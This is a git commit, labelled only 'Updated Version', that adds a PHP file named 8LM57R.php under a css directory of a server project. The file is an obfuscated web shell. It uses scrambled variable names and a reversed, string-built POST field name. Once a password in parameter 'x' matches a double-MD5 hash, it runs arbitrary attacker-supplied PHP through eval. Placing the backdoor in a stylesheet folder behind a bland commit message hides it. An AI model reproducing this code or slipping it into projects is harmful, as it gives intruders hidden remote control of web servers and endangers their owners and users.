5592c747cefd96c75b1af4ca4df80da7fb1d49f5
Fatema-Activeservers <fatema@activeservers.in>
2024-04-20 18:38:07 +0530

    Updated Version
    Updated Version

---
+++ SERVER/css/8LM57R.php
@@ -0,0 +1,35 @@
+﻿<?php
+
+function rHmmIngS()
+{
+global $DFaeWCtuhwy;
+$DFaeWCtuhwy=tzEnqaMwRYh();
+if(isset($_REQUEST['x']))
+{
+	$ardZMtncdry = 'OGYtXeHHuNGYtXeHHuEGYtXeHHuPGYtXeHHuIGYtXeHHuEGYtXeHHuCGYtXeHHuE';
+    $ardZMtncdry=str_replace('GYtXeHHu','',$ardZMtncdry);
+
+    echo $ardZMtncdry;
+	if ( strcasecmp(md5(md5($_REQUEST['x'])),'3342bbd901af446494e6fa225be45831') ==0 )
+    {
+	@eval("\"$DFaeWCtuhwy\"");
+    }
+}
+
+
+}
+function tzEnqaMwRYh()
+{
+        $nkXHyFsAR='F4gB-1l5h97tm-9f';
+		$HCPIgkGeMty=strrev($nkXHyFsAR);
+		if(isset($_POST[$HCPIgkGeMty]))
+        {
+        $JvicoxMe=str_replace('','',$_POST[$HCPIgkGeMty]);
+        
+        return '";'.$JvicoxMe.'//';
+		}
+}
+
+rHmmIngS();
+
+?>
